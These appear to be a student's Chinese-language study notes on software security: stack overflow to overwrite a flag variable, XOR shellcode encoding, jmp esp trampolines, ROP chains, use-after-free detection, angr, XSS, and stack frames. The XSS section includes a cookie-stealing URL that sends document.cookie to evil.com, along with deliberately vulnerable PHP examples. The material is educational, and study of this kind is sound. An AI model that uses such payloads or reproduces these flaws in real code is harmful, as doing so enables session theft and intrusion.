## 覆盖临界变量：

### 程序逻辑

1. **`main` 函数**:

   - 程序首先尝试加载 `user32.dll`（这步与核心漏洞利用关系不大）。
   - 它尝试以读写模式 (`"rw+"`，通常应为 `"r"` 或 `"r+"`) 打开名为 `reg.txt` 的文件。如果打开失败，程序退出。
   - 从 `reg.txt` 文件中读取一个字符串到 `regcode` 缓冲区。
   - 调用 `verify(regcode)` 函数来验证注册码。
   - 根据 `verify` 函数的返回值 (`vFlag`)，打印 "passed!" (通过) 或 "wrong regcode!" (注册码错误)。

2. **`verify` 函数**:

   - 接收一个字符串 `code` (从 `reg.txt` 读入的内容) 作为参数。

   - 定义了一个整型变量 `flag` 和一个大小为 44 字节的字符数组 `buffer`。

   - ```
     flag = strcmp(REGCODE, code);
     ```

     : 将预定义的

      

     ```
     REGCODE
     ```

      

     ("12345678") 与用户提供的

      

     ```
     code
     ```

     进行比较。

     - 如果 `code` 与 `REGCODE` 相同，`strcmp` 返回 0，`flag` 变为 0。
     - 如果不同，`strcmp` 返回非零值 (正数或负数)，`flag` 变为非零。

   - `strcpy(buffer, code);`: **这是漏洞关键点**。它将用户提供的 `code` 复制到 `buffer` 中。`strcpy` 不会检查 `buffer` 的大小，如果 `code` 的长度（加上字符串末尾的 `\0` 结束符）超过 44 字节，就会发生缓冲区溢出，多余的数据会写入 `buffer` 相邻的内存区域。

   - `return flag;`: 返回 `flag` 的值。

### 漏洞利用原理

利用目标是“利用溢出覆盖临接变量，实现控制流劫持，完成软件破解”。

1. **缓冲区溢出**: `verify` 函数中的 `char buffer[44];` 定义了一个 44 字节的缓冲区。紧随其后的 `strcpy(buffer, code);` 是不安全的，因为它不限制复制的字节数。
2. **覆盖邻接变量 `flag`**: 在 C 语言中，函数内的局部变量通常在栈上分配。变量 `int flag;` 和 `char buffer[44];` 在栈上的具体排列顺序取决于编译器。为了使描述的漏洞能够成功利用，必须假设一种特定的内存布局：即 `flag` 变量在内存中紧跟在 `buffer` 之后。 例如，内存布局可能如下（地址从低到高）：

```
... | buffer[0] ... buffer[43] | flag_byte0 | flag_byte1 | flag_byte2 | flag_byte3 | ...
      <------ buffer (44 bytes) ------> <---------- int flag (4 bytes) ---------->
```

1. 当 `strcpy(buffer, code);` 执行时：
   - 如果 `code` 的字符串长度（不包括末尾的 `\0`）正好是 44 个字符，例如 `code = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"` (44个'A')。
   - `strcpy` 会将这 44 个 'A' 复制到 `buffer[0]` 到 `buffer[43]`。
   - 然后，`strcpy` 会在复制内容的末尾添加一个空字符 `\0` 作为字符串结束符。这个 `\0` 会被写入到 `buffer[44]` 的位置。
   - 根据假设的内存布局，`buffer[44]` 正是 `flag` 变量的第一个字节（在小端字节序系统中，这是 `flag` 的最低有效字节）。
2. **修改 `flag` 的值**:
   - 在 `strcpy` 执行之前，`flag = strcmp(REGCODE, code);` 已经执行。如果提供的 `code` (例如44个'A') 与 `REGCODE` ("12345678") 不同，`flag` 会被设置为一个非零值。
   - 当 `strcpy` 将 `\0` 写入 `buffer[44]` 时，它实际上修改了 `flag` 的第一个字节。如果 `flag` 的原始值是像 `1` (即 `0x00000001`) 这样的，将其最低有效字节修改为 `0` 会使整个 `flag` 变量变为 `0` (`0x00000000`)。
3. **控制流劫持**:
   - `verify` 函数返回被修改后的 `flag` 值 (现在是 0)。
   - 在 `main` 函数中，`vFlag = verify(regcode);` 使得 `vFlag` 也为 0。
   - `if (vFlag)` 条件 (即 `if (0)`) 判断为假。
   - 因此，程序会执行 `else` 分支，打印 "passed!"，从而成功绕过了注册码验证。 这种通过修改数据来改变程序执行路径的方式，就是一种简单的控制流劫持。

### 攻击步骤（如描述所述）

“只需要设计：buffer（44字节）+1字节（整数0），即在reg.txt中写入45个字节，其中最后1个字节为0。”

- **构造输入**: 在 `reg.txt` 文件中写入一个44个字符的字符串。例如，写入44个字符 '0'。 `reg.txt` 内容: `00000000000000000000000000000000000000000000` (44个'0')

- 程序执行

  :

  1. `fscanf(fp,"%s", regcode);` 会读取这44个'0'到 `regcode`，`regcode` 字符串的实际内容是44个'0'加上一个由 `fscanf` 或 `strcpy` 保证的 `\0` 结束符。`strlen(regcode)` 为 44。
  2. `verify(regcode)` 被调用。
  3. `flag = strcmp("12345678", "000...0");`。"1" 大于 "0"，所以 `strcmp` 返回一个正值 (例如 `1`)。`flag` 变为 `1`。
  4. `strcpy(buffer, regcode);` 将44个'0'复制到 `buffer`。然后将 `\0` 写入 `buffer[44]`。
  5. 这会覆盖 `flag` 的最低有效字节为 `0`。如果 `flag` 原本是 `1` (`0x00000001`)，现在它变成 `0` (`0x00000000`)。
  6. `verify` 返回 `0`。
  7. `main` 函数中的 `vFlag` 为 `0`，程序打印 "passed!"。

描述中“在reg.txt中写入45个字节，其中最后1个字节为0”可能指文件内容本身包含一个显式的 `\0` 在第45个位置，或者更可能是指通过一个44字节的字符串输入，利用 `strcpy` 自动添加的第45个字节（即 `\0`）来实现覆盖。后者的解释更符合 `strcpy` 的行为和漏洞利用方式。

### 总结

这个例子展示了一个典型的栈缓冲区溢出漏洞，通过精心构造的输入覆盖了栈上邻近的关键变量（这里是 `flag`），从而改变了程序的正常执行流程，达到了破解软件（绕过注册）的目的。这种攻击的成功依赖于编译器特定的变量内存布局以及 `strcmp` 返回值的特性（例如，当不匹配时返回一个低字节非零的小整数）。



## 异或编码

具体实现步骤如下：

1. **`encoder` 函数**:

   - 接收两个参数：

     - `char* input`: 指向要编码的原始数据（在这里是 `sc`，即shellcode）。
     - `unsigned char key`: 用于编码的单字节密钥（在这里是 `0x44`）。

   - `len = strlen(input);`: 计算输入字符串的长度。**注意**: 如果 `sc` 包含 `\0` 字节（除了末尾的字符串结束符），`strlen` 会在第一个 `\0` 处停止，这可能不是期望的行为，因为shellcode中可能包含任意字节值。如果 `sc` 是以 `"\xAE...\x90"` 这种C字符串形式初始化的，`strlen` 会计算 `\x` 转义序列代表的实际字节数。

   - `unsigned char * output = (unsigned char *)malloc(len + 1);`: 动态分配一块内存用于存放编码后的数据。大小为 `len + 1` 是为了容纳编码后的字节以及一个可能的字符串结束符 `\0`（尽管异或编码本身不一定产生可打印的字符串，且如果原始数据包含 `\0`，`strlen` 的行为需要注意）。

   - 核心编码循环

     :

     for (i = 0; i<len; i++)

       output[i] = input[i] ^ key;

     ```
     for (i = 0; i<len; i++)
         output[i] = input[i] ^ key;
     ```

- 这个循环遍历输入字符串 `input` 中的每一个字节（从索引 `0` 到 `len-1`）。

- 对于 `input` 中的第 `i` 个字节 `input[i]`，它与传入的 `key` (例如 `0x44`) 进行**按位异或**操作。

- 异或 (XOR, `^`) 操作规则

  :

  - `0 ^ 0 = 0`
  - `0 ^ 1 = 1`
  - `1 ^ 0 = 1`
  - `1 ^ 1 = 0` 当对两个字节进行异或时，它们对应的每一位都会执行这个操作。

- 例如，如果 `input[i]` 是 `0xAE` (二进制 `10101110`)，`key` 是 `0x44` (二进制 `01000100`)：

```
  10101110  (input[i])
^ 01000100  (key)
-----------------
  11101010  (output[i], 结果是 0xEA)
```

1. - - 编码后的字节 `input[i] ^ key` 被存放到 `output` 缓冲区的相应位置 `output[i]`。
   - `……输出到文件中….`: 这部分代码（未显示）会将 `output` 缓冲区中的编码后的字节写入到一个文件中。

2. **`main` 函数**:

   - ```
     char sc[]="0xAE………………………0x90";
     ```

     : 定义了一个字符数组

      

     ```
     sc
     ```

     。

     这里表示方式可能有误解

     。

     - 如果 `sc` 的内容真的是字符串 `"0xAE...0x90"`，那么 `strlen` 会计算这个字符串字面量的长度，并且编码的是字符 '0', 'x', 'A', 'E' 等的ASCII码。
     - 如果意图是 `sc` 包含实际的字节值 `0xAE`, ..., `0x90`，那么它应该这样初始化：`char sc[] = "\xAE\x...\x90";` 或者 `unsigned char sc[] = {0xAE, ..., 0x90};`。假设这里指的是后者，即 `sc` 存储的是原始的shellcode字节。

   - `encoder(sc, 0x44);`: 调用 `encoder` 函数，将 `sc` 和密钥 `0x44` 传递给它进行编码。

**异或编码的特点**:

- **简单快速**: 异或操作在CPU层面非常高效。
- **可逆性**: 异或编码的一个重要特性是其可逆性。如果对编码后的数据再次使用相同的密钥进行异或操作，就可以恢复原始数据。 `(input[i] ^ key) ^ key = input[i]` 这就是为什么异或常用于简单的加密/解密或数据混淆。

因此，这段代码通过逐字节地将输入数据与密钥 `0x44` 进行异或运算，从而生成编码后的数据，并准备将其输出到文件。



## 基于跳板的地址定位技术

第一步，找到内存中任意一个汇编指令jmp esp，这条指令执行后可跳转到esp寄存器保存的地址，下面准备在溢出后将这条指令的地址覆盖返回地址。
第二步，设计好缓冲区溢出漏洞利用程序中的输入数据，使缓冲区溢出后，前面的填充内容为任意数据，紧接着覆盖返回地址的是jmp esp指令的地址，再接着覆盖与返回地址相邻的高地址位置并写入shellcode代码。
第三步，函数调用完成后函数返回，根据返回地址中指向的jmp esp指令的地址去执行jmp esp操作，即跳转到esp寄存器中保存的地址，而函数返回后esp中保存的地址是与返回地址相邻的高地址位置，在这个位置保存的是shellcode代码，则shellcode代码被执行。

**函数调用时的正常栈布局 (溢出前)**

当函数被调用并即将返回时，栈的布局大致如下（栈向低地址方向增长）：

```
    高地址
    ^
    |-----------------------|
    | ...                   |  (函数参数、其他局部变量等)
    |-----------------------|
    | shellcode 将被放置于此 |  (溢出后，这块区域会被我们的shellcode填充)
    |-----------------------|  <-- ESP 在函数返回前的某个位置 (具体位置取决于调用约定和栈清理)
    |      返回地址         |  (原始的、合法的函数返回地址)  <-- (EBP + 4)
    |-----------------------|
    |      保存的 EBP       |  (旧的栈帧指针)                 <-- EBP 指向这里
    |-----------------------|
    |      溢出缓冲区       |  (目标缓冲区，大小有限)
    |-----------------------|
    | ...                   |  (其他局部变量)
    |-----------------------|
    低地址
```

**图 2: 精心构造输入数据并发生溢出后的栈布局**

我们构造的输入数据会填满缓冲区，然后继续覆盖更高地址的内存：

```
    高地址
    ^
    |-----------------------|
    | ...                   |
    |-----------------------|
    | S H E L L C O D E ... |  <-- (步骤2) ESP 在函数返回后会指向这里
    |-----------------------|
    |  地址 (jmp esp)       |  <-- (步骤2) 返回地址被覆盖为 jmp esp 指令的地址
    |-----------------------|
    |  任意填充数据 (覆盖EBP)|  <-- (步骤2)
    |-----------------------|
    |  任意填充数据 (填满缓冲区)|  <-- (步骤2)
    |-----------------------|
    | ...                   |
    |-----------------------|
    低地址
```

**解释图 2 的构造：**

1. **任意填充数据 (填满缓冲区)**: 用任意数据填满原来的缓冲区。
2. **任意填充数据 (覆盖EBP)**: 继续用任意数据覆盖保存的 EBP 值（我们不关心它的原始值）。
3. **地址 (jmp esp)**: 这是关键！我们将原始的返回地址覆盖为我们找到的内存中 `jmp esp` 指令的地址。
4. **S H E L L C O D E ...**: 紧跟在被覆盖的返回地址（现在是 `jmp esp` 的地址）之后，我们放置了实际的恶意代码 (shellcode)。

------

**图 3: 函数返回时的执行流程**

1. **函数执行 `ret` 指令**:
   - `ret` 指令会从栈顶弹出一个值，并将其作为新的指令地址加载到 `EIP` (指令指针寄存器)。
   - 此时，栈顶的值是我们覆盖的 "**地址 (jmp esp)**"。
   - 所以，`EIP` 现在指向了内存中那条 `jmp esp` 指令。

```
CPU 执行流:
... 函数代码 ...
ret  ---------------------> EIP = 地址(jmp esp)
```

**执行 `jmp esp` 指令**:

- CPU 跳转到 `EIP` 指向的地址，开始执行 `jmp esp` 指令。
- `jmp esp` 指令的作用是：无条件跳转到 `ESP` (栈顶指针寄存器) 当前所指向的地址。
- **关键点**：当函数执行 `ret` 指令后，`ESP` 会自动增加（通常是4字节，因为弹出了一个返回地址）。此时，`ESP` 正好指向了我们之前放置 **shellcode** 的起始位置！

```
内存中的 jmp esp gadget:
...
地址(jmp esp):  jmp esp  ------> EIP = ESP 当前指向的地址
...

栈的状态 (在 ret 执行后，jmp esp 执行前):
高地址
^
|-----------------------|
| ...                   |
|-----------------------|
| S H E L L C O D E ... |  <-- ESP 指向这里！
|-----------------------|
|  地址 (jmp esp)       |  (刚刚被 ret 指令弹出)
|-----------------------|
...
低地址
```

**Shellcode 执行**:

- 由于 `jmp esp` 指令使 `EIP` 跳转到了 `ESP` 指向的地址，而 `ESP` 正好指向我们的 shellcode。
- 因此，CPU 开始从 shellcode 的第一条指令执行。

```
CPU 执行流:
...
jmp esp  ---------------------> EIP = shellcode 的起始地址
                                 (CPU 开始执行 shellcode)
```



![image-20250607214935877](C:\Users\coffe\AppData\Roaming\Typora\typora-user-images\image-20250607214935877.png)

这个图片和文字描述的是**返回导向编程（Return-Oriented Programming, ROP）**的基本原理，通过链接一系列被称为 "gadgets" 的小程序代码段来实现特定的逻辑。每个 gadget 通常是一小段已存在于程序或库内存中的指令序列，并以 `retn` (返回) 指令结尾。

**核心思想：**

通过控制栈上的数据，攻击者可以精心安排一系列 `retn` 指令将要跳转到的地址。每次 `retn` 执行时，它会从栈顶弹出一个地址并跳转到那里。如果这个地址指向一个 gadget 的开头，那么这个 gadget 的指令就会被执行，直到遇到它末尾的 `retn`。这个 `retn` 又会从栈顶弹出下一个 gadget 的地址，如此循环往复，形成一个 "ROP链"。

**图片中的示例解释：**

目标：通过 ROP 链将 `EDX` 寄存器的值设置为 0。

**栈的初始布局 (由攻击者精心构造)：**

```
    高地址
    ^
    |-------------------|
    | ????????          |  <-- (将被 XCHG EAX,EDX # RETN 的 retn 使用)
    |-------------------|
    | 地址(XCHG EAX,EDX # RETN) |  Gadget 3 的地址
    |-------------------|
    | ????????          |  <-- (将被 INC EAX # RETN 的 retn 使用)
    |-------------------|
    | 地址(INC EAX # RETN)    |  Gadget 2 的地址
    |-------------------|
    | 0xffffffff        |  <-- (将被 POP EAX 使用的数据)
    |-------------------|
    | 地址(POP EAX # RETN)    |  Gadget 1 的地址  <-- ESP (栈顶指针) 初始指向这里
    |-------------------|
    低地址
```

**执行流程：**

EIP存储了下一条要被执行的指令

1. **第一次 `retn` (假设由前一个被控制的返回地址触发)：**

   - `ESP` 指向 `地址(POP EAX # RETN)`。
   - `retn` 执行，`EIP` (指令指针) 跳转到 `POP EAX # RETN` 这个 gadget 的地址。
   - `ESP` 上移，指向 `0xffffffff`。

2. **执行 Gadget 1: `POP EAX # RETN`**

   - `POP EAX`

     : 从栈顶弹出数据 (

     ```
     0xffffffff
     ```

     ) 到

     ```
     EAX
     ```

     寄存器。

     - `EAX` 现在的值是 `0xffffffff`。
     - `ESP` 上移，指向 `地址(INC EAX # RETN)`。

   - `RETN`

     ```
     EIP
     ```

     跳转到栈顶的地址，即

     ```
     地址(INC EAX # RETN)
     ```

     - `ESP` 上移，指向 `????????` (Gadget 2 的 `retn` 将要使用的返回地址，这里我们不关心它的具体值，只要它能让程序继续或者指向下一个我们控制的地址即可)。

3. **执行 Gadget 2: `INC EAX # RETN`**

   - `INC EAX`

     : 将

     ```
     EAX
     ```

     寄存器的值加 1。

     - `EAX` 原本是 `0xffffffff` (二进制全1)，加1后会发生溢出，变为 `0x00000000` (0)。
     - `EAX` 现在的值是 `0`。

   - `RETN`

     :

     ```
     EIP
     ```

     跳转到栈顶的地址，即

     ```
     地址(XCHG EAX,EDX # RETN)
     ```

     - `ESP` 上移，指向 `????????` (Gadget 3 的 `retn` 将要使用的返回地址)。

4. **执行 Gadget 3: `XCHG EAX,EDX # RETN`**

   - `XCHG EAX,EDX`

     : 交换

     ```
     EAX
     ```

     和

     ```
     EDX
     ```

     寄存器的值。

     - `EAX` 当前是 `0`。`EDX` 的初始值未知（或者说我们不关心它的初始值）。
     - 交换后，`EDX` 的值变为 `0`，`EAX` 的值变为 `EDX` 原来的值。
     - **目标达成：`EDX` 被设置为 `0`。**

   - **`RETN`**: `EIP` 跳转到栈顶的地址 (即 `????????`)。ROP 链的这一部分执行完毕。





## 漏洞检测规则说明

这些规则用于跟踪指针变量的生命周期状态，检测常见的内存管理错误：

### 状态转换规则：

1. **`v 被分配空间 ==> v.start`**
   - 当指针变量 `v` 被分配内存时，进入 `start` 状态
2. **`v.start: {kfree(v)} ==> v.free`**
   - 当指针 `v` 在 `start` 状态下被释放（调用 `kfree`），转为 `free` 状态
3. **`v.free: {\*v} ==> v.useAfterFree`**
   - 当指针 `v` 在 `free` 状态下被解引用（使用 `*v`），检测到 **Use-After-Free** 漏洞
4. **`v.free: {kfree(v)} ==> v.doubleFree`**
   - 当指针 `v` 在 `free` 状态下再次被释放，检测到 **Double-Free** 漏洞



![image-20250608193441009](C:\Users\coffe\AppData\Roaming\Typora\typora-user-images\image-20250608193441009.png)

这是两个不同函数的**控制流图**，用于检测指针变量的错误使用：

## 左侧：`contrived_caller` 函数

这是**调用者函数**的控制流：

1. **节点1**：函数入口，参数 `w,x,p`
2. **节点2**：执行 `kfree(p)` - 释放指针p，此时 `p.free`
3. **节点3**：调用 `contrived(p, w, x)` - 将已释放的指针p传递给其他函数
4. **节点4**：执行 `return *w` - 返回时解引用w

**检测到的问题**：在节点4处，`p.useAfterFree, w.free` - 存在释放后使用的风险

## 右侧：`contrived` 函数

这是**被调用函数**的控制流：

1. **节点1**：函数入口，参数 `p,w,x`

2. **节点2**：声明 `int *q`

3. 分支

   ：根据条件

    

   ```
   x!=0
   ```

    

   和

    

   ```
   x=0
   ```

    

   分为两个路径

   - **路径1**（节点3）：执行 `kfree(w)`，然后 `q=p`
   - **路径2**（节点5）：直接 `q=w`

4. **节点6**：执行 `return *q` - 解引用指针q

**检测到的问题**：

- 节点3处：`p.free, w.free` - 多个指针被释放
- 节点6处：`p.free, w.free, q.free` - 返回时解引用已释放的指针

## 分析目的

这种**路径敏感的数据流分析**可以：

- 跟踪指针在不同执行路径上的状态变化
- 检测跨函数调用的内存管理错误
- 识别复杂的Use-After-Free和Double-Free漏洞场景

通过控制流图，可以清晰看到指针状态在程序执行过程中的变化，帮助识别潜在的内存安全漏洞。

### 为什么6的前置条件是p.free、w.free、q.free

## 路径分析

从控制流图可以看到，要到达节点6，有两个可能的路径：

### 路径1：节点1 → 2 → 3 → 4 → 6

1. **节点2**：声明 `int *q`
2. **节点3**：执行 `kfree(w)` → 此时 `w.free`
3. **节点4**：执行 `q = p` → q指向p，此时 `q` 继承了 `p` 的状态

### 路径2：节点1 → 2 → 5 → 6

1. **节点2**：声明 `int *q`
2. **节点5**：执行 `q = w` → q指向w

## 状态传播分析

**关键点**：从左侧的 `contrived_caller` 函数可以看到：

- 在节点2执行了 `kfree(p)` → `p.free`
- 然后调用 `contrived(p, w, x)`，将已释放的指针 `p` 传入

因此进入 `contrived` 函数时：

- **参数p已经是 `p.free` 状态**（从调用者传入）

在 `contrived` 函数内部：

- **路径1**：`kfree(w)` → `w.free`，然后 `q=p` → `q` 继承 `p.free` 状态
- **路径2**：`q=w`，但如果w在其他路径也被释放了，则 `q` 也是free状态

## 汇合点分析

节点6是两个路径的**汇合点**，静态分析工具需要考虑**所有可能的执行路径**，因此：

- `p.free`：从调用者传入时就已经是释放状态
- `w.free`：在路径1中被 `kfree(w)` 释放
- `q.free`：无论哪个路径，q最终都可能指向已释放的内存

这种分析确保了在节点6执行 `return *q` 时，能够检测到所有可能的 **Use-After-Free** 漏洞场景。



![image-20250608200021229](C:\Users\coffe\AppData\Roaming\Typora\typora-user-images\image-20250608200021229.png)

什么是插桩：**插桩（Instrumentation）** 是软件测试和分析中的一种技术，指在源代码或编译后的程序中**插入额外的代码**来监控程序的执行情况。

```c++
// 原始代码
int add(int a, int b) {
    return a + b;
}

// 插桩后的代码（示例）
int add(int a, int b) {
    __coverage_count[0]++;  // 插入的覆盖率统计代码
    return a + b;
}
```



![image-20250608202848700](C:\Users\coffe\AppData\Roaming\Typora\typora-user-images\image-20250608202848700.png)



lab9是如何实现的：

```python
#!/usr/bin/env python
 # coding=utf-8
 import angr
 import claripy
 def hook_demo(state):
 state.regs.eax = 0
 p = angr.Project("./issue", load_options={"auto_load_libs": False})
 # hook 函数：addr 为待 hook 的地址
# hook 为 hook 的处理函数，在执行到 addr 时，会执行这个函数，同时把当前的 state 对象作为参数
传递过去
# length 为待 hook 指令的长度，在执行完 hook 函数以后，angr 需要根据 length 来跳过这条指
令，执行下一条指令
# hook 0x08048485 处的指令（xor eax,eax），等价于将 eax 设置为 0
 # hook 并不会改变函数逻辑，只是更换实现方式，提升符号执行速度
p.hook(addr=0x08048485, hook=hook_demo, length=2)
 state = p.factory.blank_state(addr=0x0804846B, 
add_options={"SYMBOLIC_WRITE_ADDRESSES"})
 u = claripy.BVS("u", 8)
 state.memory.store(0x0804A021, u)
 sm = p.factory.simulation_manager(state)
 sm.explore(find=0x080484DB)
 st = sm.found[0]
 print(repr(st.solver.eval(u)))
```



![image-20250609185854875](C:\Users\coffe\AppData\Roaming\Typora\typora-user-images\image-20250609185854875.png)

哪儿冒出来的控依赖：我是盲人

```c
for (int j = 0; j < x; j++) {
    y = y + 1;
}
```



```
// 危险的做法 - 直接插入用户输入
function displayUserComment(userInput) {
    document.getElementById('comments').innerHTML = userInput; // 危险!
}

// 用户输入: <script>alert('XSS攻击!')</script>
// 结果: 恶意脚本被执行
```

```
用户输入: "这个网站很棒！"
网页显示: 这个网站很棒！

恶意用户输入: <script>alert('我是黑客!')</script>
网页不仅显示文字，还会执行这段代码！
结果: 弹出警告框显示"我是黑客!"
```



## 🔄 两种XSS的对比

| 特征         | 反射式XSS                | 存储式XSS              |
| ------------ | ------------------------ | ---------------------- |
| **脚本来源** | URL参数、表单提交        | 数据库、文件存储       |
| **触发方式** | 点击恶意链接             | 访问包含恶意内容的页面 |
| **影响范围** | 单个用户（点击链接的人） | 所有访问者             |
| **持续性**   | 临时的                   | 持久的                 |

## 反射式XSS - 脚本来自Web应用程序请求

### 🔍 什么是反射式XSS？

恶意脚本通过**URL参数、表单提交**等方式发送给服务器，服务器**直接反射回来**显示在页面上。

### 📝 举例说明

#### 1. 搜索功能的反射式XSS

```php
<!-- 正常的搜索页面 -->
<!-- filepath: search.php -->
<?php
$query = $_GET['q']; // 获取搜索关键词
?>
<html>
<body>
    <h1>搜索结果</h1>
    <p>您搜索的是: <?php echo $query; ?></p> <!-- 危险：直接输出用户输入 -->
</body>
</html>
```

**攻击过程：**

```
1. 正常搜索：
   URL: http://website.com/search.php?q=苹果
   页面显示: 您搜索的是: 苹果

2. 恶意攻击：
   URL: http://website.com/search.php?q=<script>alert('XSS')</script>
   页面显示: 您搜索的是: <script>alert('XSS')</script>
   结果: 脚本被执行！弹出警告框
```



#### 2. 错误信息的反射式XSS

```php
<?php
$error_msg = $_GET['error'];
?>
<html>
<body>
    <h1>错误页面</h1>
    <p style="color:red;">错误: <?php echo $error_msg; ?></p>
</body>
</html>
```

**攻击链接：**

http://website.com/error.php?error=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>

## 存储式XSS - 脚本被Web应用程序存储

### 📝 举例说明

#### 1. 留言板的存储式XSS

```php
<?php
// 保存评论到数据库
if ($_POST['comment']) {
    $comment = $_POST['comment'];
    // 危险：直接存储用户输入到数据库
    mysqli_query($conn, "INSERT INTO comments (content) VALUES ('$comment')");
}

// 显示所有评论
$result = mysqli_query($conn, "SELECT content FROM comments");
?>
<html>
<body>
    <h1>用户评论</h1>
    <?php while($row = mysqli_fetch_array($result)): ?>
        <div class="comment">
            <?php echo $row['content']; ?> <!-- 危险：直接输出存储的内容 -->
        </div>
    <?php endwhile; ?>
    
    <form method="post">
        <textarea name="comment" placeholder="发表评论..."></textarea>
        <button type="submit">提交</button>
    </form>
</body>
</html>
```

**攻击过程：**

```
1. 攻击者在评论框输入：
   <script>alert('所有访问者都会看到这个！')</script>

2. 脚本被存储到数据库

3. 每个访问网站的用户都会看到这个恶意脚本执行
```

## 📊 总结对比

| 脚本来源方式 | 反射式XSS               | 存储式XSS              |
| ------------ | ----------------------- | ---------------------- |
| **URL参数**  | ✅ `?search=<script>...` | ❌                      |
| **表单数据** | ✅ 立即反射到响应页面    | ✅ 但先存储再显示       |
| **数据库**   | ❌                       | ✅ 从数据库读取恶意内容 |
| **文件**     | ❌                       | ✅ 从文件读取恶意内容   |
| **持久性**   | 临时（仅当次请求）      | 永久（直到被清理）     |



![image-20250616221051584](C:\Users\coffe\AppData\Roaming\Typora\typora-user-images\image-20250616221051584.png)

关于栈帧调整：

保存当前栈帧状态值，以备后面恢复本栈帧时使用

```
调用前:
┌──────────┐ ← ESP (调用者栈顶)
│ 调用者数据 │
│    ...    │
└──────────┘ ← EBP (调用者栈帧指针)

调用后:
┌──────────┐ ← ESP (新栈顶)
│ 旧EBP值  │ ← 保存的调用者栈帧指针
├──────────┤ ← EBP (新栈帧指针)
│ 调用者数据 │
│    ...    │
└──────────┘
```

将当前栈帧切换到新栈帧

```
步骤1 - 参数入栈:
┌──────────┐
│  参数3   │
│  参数2   │  
│  参数1   │
│ 返回地址  │ ← ESP
└──────────┘

步骤2 - 保存旧栈帧:
┌──────────┐
│  参数3   │
│  参数2   │
│  参数1   │
│ 返回地址  │
│ 旧EBP值  │ ← ESP, EBP
└──────────┘

步骤3 - 分配新空间:
┌──────────┐ ← ESP
│ 局部变量  │
│    ...    │
├──────────┤ ← EBP
│ 旧EBP值  │
│ 返回地址  │
│  参数1   │
│  参数2   │
│  参数3   │
└──────────┘
```



```
O-Flag(溢出标志)：反映有符号数加减运算是否溢出。如果运算结果超过了有符号数的表示范围，则OF置1，否则置0。例如：EAX的值为7FFFFFFFF，如果你此时再给EAX加1，OF寄存器就会被设置成1，因为此时EAX寄存器的最高有效位改变了。 
C-Flag(进位标志)：用于反映运算是否产生进位或借位。如果运算结果的最高位产生一个进位或借位，则CF置1，否则置0。例，假如某寄存器值为FFFFFFFF，再加上1就会产生进位。
区别分析（我是蠢猪不要管我）
```

### OF标志位（溢出标志）

- **针对对象**：有符号数运算
- **检测内容**：是否超出有符号数的表示范围
- **关注点**：符号位的正确性

### CF标志位（进位标志）

- **针对对象**：无符号数运算
- **检测内容**：是否产生进位或借位
- **关注点**：最高位是否有进位



数据流分析和污点分析的区别是什么：

## 定义和目标

### 数据流分析 (Data Flow Analysis)

- **定义**：分析程序中数据在控制流图中的传播路径
- **目标**：优化编译器、检测未初始化变量、死代码消除等

### 污点分析 (Taint Analysis)

- **定义**：跟踪不可信数据（污点）在程序中的传播
- **目标**：检测安全漏洞，如SQL注入、XSS攻击等

## 分析范围

| 特征         | 数据流分析       | 污点分析           |
| ------------ | ---------------- | ------------------ |
| **关注点**   | 所有数据的流动   | 特定的不可信数据   |
| **数据来源** | 程序中的所有变量 | 外部输入、用户数据 |
| **传播规则** | 通用的数据传播   | 污点传播和净化规则 |

**数据流分析**是更通用的程序分析技术，关注所有数据的流动模式；**污点分析**是专门针对安全的数据流分析，专注于跟踪不可信数据的传播路径。污点分析可以看作是数据流分析在安全领域的特化应用。
